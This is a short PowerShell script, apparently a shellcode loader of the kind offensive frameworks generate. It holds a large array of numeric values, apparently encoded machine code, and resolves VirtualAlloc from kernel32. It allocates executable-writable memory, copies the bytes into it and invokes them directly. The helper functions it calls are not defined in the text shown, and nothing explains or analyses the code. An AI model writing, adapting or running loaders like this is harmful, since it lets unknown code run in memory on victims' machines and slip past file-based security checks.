$var_code=@("120
88
195
230
244
228
200
0
0
0
61
81
61
82
86
82
90
68
45
214
105
82
157
82
104
82
157
82
32
82
157
82
2
82
122
87
82
109
89
90
87
82
45
196
87
82
45
170
16
97
94
66
47
1
61
199
196
11
61
1
199
222
193
81
61
82
157
82
2
157
96
14
82
1
202
120
126
92
24
61
90
170
194
82
24
126
95
95
82
94
90
95
82
94
90
95
82
121
182
1
61
82
189
182
95
82
157
48
211
109
189
189
189
161
0
81
166
95
84
93
84
93
97
50
0
61
90
165
167
96
165
161
61
96
95
89
36
161
105
82
45
196
82
45
210
87
45
196
87
45
196
82
82
82
96
6
126
89
161
161
161
82
186
226
89
82
1
202
127
82
186
24
0
0
0
82
189
199
11
166
190
0
0
0
195
225
195
166
0
0
0
198
170
189
189
189
11
110
91
90
91
76
11
76
100
110
91
91
11
77
63
91
91
91
76
81
91
76
91
91
91
11
106
77
63
91
91
91
11
76
91
91
76
11
91
91
91
6
84
91
91
76
6
84
91
91
76
6
9
47
1
91
91
91
6
77
91
76
92
91
6
9
47
1
91
91
91
6
94
91
91
76
95
91
6
9
47
1
91
76
91
91
76
91
6
84
91
91
76
6
94
91
91
76
6
84
91
91
76
11
91
91
91
91
76
81
91
76
91
91
91
11
61
90
165
166
91
76
97
91
76
95
95
82
1
205
221
221
45
13
29
18
29
19
29
13
29
29
18
0
68
82
36")


$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
	

$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)

